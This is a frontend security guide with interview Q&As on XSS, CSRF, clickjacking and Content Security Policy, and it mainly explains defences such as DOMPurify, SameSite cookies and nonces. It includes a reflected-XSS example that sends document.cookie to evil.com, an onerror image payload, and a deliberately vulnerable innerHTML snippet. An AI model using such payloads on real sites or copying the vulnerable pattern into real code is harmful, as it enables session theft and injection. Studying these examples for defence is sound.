# Web Frontend Security & Client-Side Mitigations

This guide provides an advanced architectural deep-dive into the mechanics of frontend vulnerabilities (XSS, CSRF, and Clickjacking), their data-flow lifecycles, HTML sanitization strategies, and Content Security Policy (CSP) configurations.

---

## 1. Cross-Site Scripting (XSS) Deep Dive

Cross-Site Scripting occurs when an attacker successfully injects and executes malicious JavaScript inside the context of a victim's trusted browser session.

### A. The Three Classes of XSS

```
                   CROSS-SITE SCRIPTING (XSS) FLOWS
                                │
         ┌──────────────────────┼──────────────────────┐
         ▼                      ▼                      ▼
    [STORED XSS]           [REFLECTED XSS]         [DOM-BASED XSS]
 (Permanent DB Payload)  (Query Param Reflection) (Client-Side Sink Mutation)
         │                      │                      │
 1. Attacker posts payload   1. Attacker crafts URL   1. Attacker inputs hash:
    to server DB.           with script parameter.   `site.com/#<img src=x onerror=...>`
         │                      │                      │
 2. Server renders DB        2. Server echoes script  2. Client-side JS reads hash
    content to victim.      directly in HTML.        and inserts into innerHTML.
         │                      │                      │
         ▼                      ▼                      ▼
  [Script Executes]      [Script Executes]      [Script Executes]
 (Steals Session Cookie) (Steals Session Cookie) (Steals Session Cookie)
```

#### 1. Stored XSS (Persistent)
The most severe class. The attacker transmits a malicious script payload directly to the application's backend database (e.g., inside a blog comment, forum post, or profile name).
* **The Execution:** When other users navigate to that resource, the server retrieves the payload from the database and renders it raw inside the HTML document. The victim's browser executes the script in their active session context.

#### 2. Reflected XSS (Non-Persistent)
The payload is carried inside the HTTP request itself (commonly in a query parameter or input form value).
* **The Execution:** The attacker crafts a malicious URL:
  `https://target.com/search?query=<script>fetch("http://evil.com?cookie=" + document.cookie)</script>`
  When the victim clicks this link, the server receives the request, processes the parameter, and echoes (reflects) the script payload directly back inside the response HTML, triggering immediate execution in the victim's browser.

#### 3. DOM-Based XSS
Unlike Stored or Reflected XSS, **DOM-based XSS executes entirely client-side**. The payload never travels to the backend server.
* **The Execution:** The vulnerability occurs when client-side JavaScript reads data from an untrusted **Source** and passes it unsanitized into a vulnerable execution point (**Sink**) in the Document Object Model.

---

### B. DOM-Based XSS: Sources and Sinks
To defend against DOM-based XSS, frontend engineers must strictly audit data boundaries:

* **Sources (Untrusted Input Channels):**
  - `location.search` (Query parameters)
  - `location.hash` (Hash fragment)
  - `document.referrer` (Previous page URL)
  - `window.name` (Cross-origin window property)
* **Sinks (Vulnerable Execution Points):**
  - **HTML Rendering:** `.innerHTML`, `document.write()`, `document.writeln()`.
  - **Script Compilers:** `eval()`, `setTimeout("string")`, `setInterval("string")`, `new Function("string")`.
  - **Resource Resolvers:** `element.src`, `element.href` (when passing `javascript:` protocols).

```javascript
// CATASTROPHIC DOM XSS EXAMPLE:
// Vulnerable Source: location.hash (e.g., site.com/#<img src=x onerror=alert(1)>)
const payload = decodeURIComponent(window.location.hash.substring(1));

// Vulnerable Sink: innerHTML (renders and executes the raw payload string)
document.getElementById("container").innerHTML = payload; 
```

---

### C. Developer Defenses & HTML Sanitization

To eliminate XSS in production, developers must apply strict rendering rules:

#### 1. Use Safe Sinks by Default
For plain text injection, avoid `.innerHTML` completely. Use properties that treat inputs strictly as text nodes, automatically escaping characters:
```javascript
// SECURE: Browser renders raw strings, escaping characters like '<' to '&lt;'
document.getElementById("container").textContent = payload;
```

#### 2. Deploy HTML Sanitization (DOMPurify)
If your application *must* render rich HTML (e.g., parsing a user's markdown or blog post rich-text editor), you cannot use plain string escaping because it strips valid tags (like `<b>`, `<i>`).
* **The Solution:** Run the string through a highly secure, battle-tested library like **`DOMPurify`** or the native **`Sanitizer API`** *before* passing it to `.innerHTML`.
* **How Sanitization Works:** DOMPurify parses the HTML string into an in-memory document fragment, traverses the nodes, and strips out malicious tags (like `<script>`, `<iframe>`, `<object>`) and dangerous event attributes (like `onload`, `onerror`, `onclick`, or `javascript:` URI protocols).

```javascript
import DOMPurify from 'dompurify';

const rawHTML = '<p>Hello <b>World</b> <img src=x onerror="stealTokens()"></p>';

// DOMPurify strips the malicious <img> error handler, returning a safe string:
// "<p>Hello <b>World</b> <img src=\"x\"></p>"
const safeHTML = DOMPurify.sanitize(rawHTML);

document.getElementById("container").innerHTML = safeHTML; // Secure!
```

---

## 2. Cross-Site Request Forgery (CSRF) Deep Dive

In a CSRF attack, an attacker tricks a victim's browser into executing state-changing HTTP requests (e.g., transferring funds, changing emails) on a trusted website where the victim is currently authenticated.

### A. The Attack Vector

```
                     CROSS-SITE REQUEST FORGERY (CSRF)
                                │
 1. Victim logs in to bank.com. │ 2. Attacker tricks victim to click link.
    Browser gets AUTH Cookie.   │    Victim visits evil.com in same browser.
         │                      │         │
         v                      │         v
  [Authenticated Session]       │  [evil.com triggers POST to bank.com/transfer]
                                │         │
                                v         v
 3. Browser AUTOMATICALLY attaches bank.com cookies to the cross-site request!
                                │
                                v
 4. bank.com server reads valid AUTH cookie and executes transaction. (CRASH!)
```

### B. High-Impact Developer Defenses
To defend against CSRF, applications must prevent the browser from automatically sending credentials on cross-site requests.

#### 1. SameSite Cookie Flag (The Modern Standard)
Configure the session cookie with `SameSite=Lax` or `SameSite=Strict`.
* **`SameSite=Strict`:** The browser will *never* send the cookie on cross-site requests. Clicking an external search link to your app will load the user as logged out.
* **`SameSite=Lax` (Default):** The browser blocks cookies on cross-site subrequests (images, iframes, background forms), but allows them during top-level navigations (clicking standard links). This successfully neutralizes automatic background CSRF exploits while preserving standard navigation login states.

#### 2. The Double-Submit Cookie Pattern (Stateless APIs)
For stateless REST APIs where the server does not store active session mappings on disk, deploy the Double-Submit Cookie Pattern:

1. **Token Generation:** Upon login, the server generates a cryptographically secure, random **CSRF Token**.
2. **Double Submission:**
   * The server writes this token as a **non-HttpOnly Cookie** (accessible to JavaScript) named `csrf-token`.
   * When making state-changing requests (`POST`, `PUT`, `DELETE`), the client-side JavaScript reads the token from the cookie and replicates it inside a custom request header (e.g., `X-CSRF-Token: <UUID>`).
3. **Server Verification:** The server receives the request. It compares the token inside the custom header with the token inside the incoming cookie. If they match and are cryptographically valid, the request is processed.
4. **Why this is Secure:** Under the browser's strict **Same-Origin Policy (SOP)**, scripts running on `evil.com` cannot read cookies belonging to `bank.com`. Although `evil.com` can trigger a form submission that automatically attaches `bank.com` cookies, it cannot access the cookie value to inject the matching token inside the custom HTTP header, immediately failing server validation.

---

## 3. Clickjacking (UI Redressing) & Framing Defenses

In a **Clickjacking** attack, an attacker overlays an invisible `iframe` containing a legitimate target website (e.g., a "Delete Profile" panel) directly on top of a malicious, tempting page button (e.g., a "Win Free Cash!" button) with `opacity: 0`.

```
                    CLICKJACKING LAYER STACK
+-----------------------------------------------------------+
| Legitimate Web View (e.g., bank.com/transfer)             |
| OPACITY: 0 (COMPLETELY INVISIBLE IFRAME)                   | <── Active Click Layer
| [CONFIRM TRANSFER BUTTON] (Sits exactly over tempting btn)|
+-----------------------------------------------------------+
| Attacker Page (e.g., evil.com/win-prize)                  |
| OPACITY: 1.0 (VISUALLY ENCOURAGING SCREEN)                | <── Visual Layer
| [CLICK TO WIN CASH! BUTTON]                               |
+-----------------------------------------------------------+
```

When the victim clicks the visible "Win Cash!" button, they are physically clicking the invisible "Confirm Transfer" button on the layer above, executing a silent transaction in their background session.

### A. Framing Mitigations
To neutralize clickjacking, developers must instruct browsers to block framing of their application resources.

1. **Content Security Policy: `frame-ancestors` (Modern Standard):**
   Instructs browsers which external hosts are permitted to embed your pages inside `<frame>`, `<iframe>`, or `<embed>` elements:
   `Content-Security-Policy: frame-ancestors 'self'`
   * *Usage:* Set to `'none'` to block all framing globally, or `'self'` to only permit framing on your own origin.
2. **`X-Frame-Options` (Legacy Fallback):**
   A legacy HTTP header used before CSP was standardized:
   `X-Frame-Options: DENY`
   * *Values:* `DENY` (blocks framing entirely) or `SAMEORIGIN` (allows local origin framing).

---

## 4. Designing a Content Security Policy (CSP)

A **Content Security Policy (CSP)** is an HTTP response header that provides a robust safety net against XSS, clickjacking, and data-injection attacks by restricting which sources of scripts, styles, images, and fonts the browser is permitted to load and execute.

### A. Crucial CSP Directives

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://apis.trusted.com; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data:; 
  connect-src 'self' https://api.analytics.com;
```

* **`default-src`:** The ultimate fallback directive. If a specific asset source (like `img-src`) is not declared, the browser defaults to this rule.
* **`script-src`:** Controls which external domains can execute JavaScript scripts.
* **`connect-src`:** Restricts the APIs and web-sockets to which client-side code can establish connections (e.g., limiting `fetch()`, `Axios`, and WebSocket calls).
* **`img-src`:** Limits image resolution sources (including base64 `data:` URIs).

---

### B. Advanced Hardening: Cryptographic Nonces

Blocking raw inline scripts (e.g., `<script>alert(1)</script>`) is the core mechanism of XSS mitigation. However, production apps often require safe inline bootstrapping scripts.

* **The Problem:** Enabling `'unsafe-inline'` in `script-src` completely disables XSS protections.
* **The Solution (Nonces):**
  1. For every HTTP request, the server generates a unique, cryptographically secure random string called a **Nonce** (e.g., `nonce-a8f7c9...`).
  2. The server attaches this nonce to the CSP header:
     `Content-Security-Policy: script-src 'self' 'nonce-a8f7c9...'`
  3. The server injects the matching nonce attribute directly into any permitted inline script tag in the HTML body:
     ```html
     <script nonce="a8f7c9...">
       console.log("Safe inline bootstrap script!");
     </script>
     ```
  4. At runtime, the browser reads the CSP header's nonce. It permits execution of the inline script because its tag attribute matches the header nonce. If an attacker attempts to inject a script via XSS, it will fail to execute because the attacker cannot guess the unique, per-request random nonce.

---

## 5. Interview Masterclass: High-Impact Q&As

### Q1: Compare the execution lifecycles and physical paths of Stored, Reflected, and DOM-based XSS.
* **Answer:**
  * **Stored XSS:** The malicious payload is persistently stored in the application's backend database. When other users request the page, the server fetches the script from the DB and renders it raw inside the HTML response, causing global execution across all visiting browsers.
  * **Reflected XSS:** The payload is carried inside the HTTP request (query parameters or form submissions). The server immediately processes the request and echoes (reflects) the payload back in the HTML response. It is non-persistent and requires the victim to click a customized malicious link.
  * **DOM-Based XSS:** The entire lifecycle occurs client-side. The payload never travels to the server and is not processed in backend code. Instead, client-side JS reads input from an untrusted **Source** (e.g., `location.hash`) and passes it raw into a vulnerable execution point or **Sink** (e.g., `.innerHTML`), mutating the active DOM dynamically.

### Q2: What are "Sources and Sinks" in DOM-based XSS, and how does HTML Sanitization (via DOMPurify) safely render rich-text HTML?
* **Answer:**
  * **Sources:** API properties that read untrusted data directly from the client window or environment (such as `location.search`, `location.hash`, or `document.referrer`).
  * **Sinks:** Execution or rendering interfaces that parse input strings as code or DOM nodes (such as `innerHTML`, `document.write()`, or `eval()`).
  * **DOMPurify Sanitization:** Escaping strings converts `<` into `&lt;`, rendering HTML text-only and stripping all rich formatting. To preserve rich formatting (like bold `<b>` tags) while staying secure, DOMPurify:
    1. Parses the raw string into an in-memory document fragment.
    2. Iterates over every node, comparing elements against a strict allowlist.
    3. Expunges high-risk elements (like `<script>`, `<iframe>`) and dangerous attributes (like `onload`, `onerror`, or `javascript:` protocols).
    4. Serializes the safe fragment back into a clean HTML string, ready for `.innerHTML` injection.

### Q3: Explain how the Double-Submit Cookie pattern protects stateless REST APIs from Cross-Site Request Forgery (CSRF).
* **Answer:** CSRF relies on the browser's default behavior of automatically attaching cookies when making cross-site requests.
  * Under the **Double-Submit Cookie** pattern:
    1. The server generates a random CSRF token on login and writes it as a non-HttpOnly cookie (`csrf-token`).
    2. When the client script makes a state-changing API request (like `POST`), it reads the token from the cookie and injects it inside a custom header (e.g., `X-CSRF-Token`).
    3. The server compares the token in the cookie with the token in the header. If they match, the request is approved.
  * *Why this is Secure:* Under the **Same-Origin Policy (SOP)**, scripts running on a malicious origin (`evil.com`) are strictly blocked from reading cookies belonging to `bank.com`. Although `evil.com` can force the browser to trigger a form submit that automatically attaches `bank.com` cookies, it cannot access the cookie value to replicate the token inside the custom HTTP request header, immediately failing server validation.

### Q4: Compare `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` as clickjacking defenses.
* **Answer:**
  * **`X-Frame-Options`:** A legacy HTTP header that restricts framing using two values: `DENY` (blocks all framing globally) or `SAMEORIGIN` (allows local origin framing). It is evaluated at the page-level and lacks fine-grained domain control.
  * **`Content-Security-Policy: frame-ancestors`:** The modern, standard directive. It restricts framing at the CSP layer, allowing developers to define a customized list of trusted domains permitted to frame the resource (e.g., `frame-ancestors 'self' https://trusted-partner.com`). It takes absolute precedence in modern browsers and supports granular multi-domain policies that `X-Frame-Options` cannot scale.
